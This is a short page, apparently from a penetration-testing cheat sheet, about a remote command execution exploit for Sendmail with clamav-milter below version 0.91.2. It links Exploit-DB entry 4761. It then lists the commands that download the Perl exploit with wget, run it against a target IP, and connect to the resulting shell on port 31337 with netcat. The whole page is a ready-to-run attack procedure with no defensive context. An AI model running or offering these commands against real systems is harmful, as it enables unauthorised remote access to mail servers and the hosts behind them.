---
description: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
---

# Sendmail ClamAV

{% embed url="https://www.exploit-db.com/exploits/4761" %}

```
$ wget https://www.exploit-db.com/raw/4761
$ mv 4761 black-hole.pl
$ perl black-hole.pl 192.168.1.2
$ nc -v 192.168.1.2 31337
```
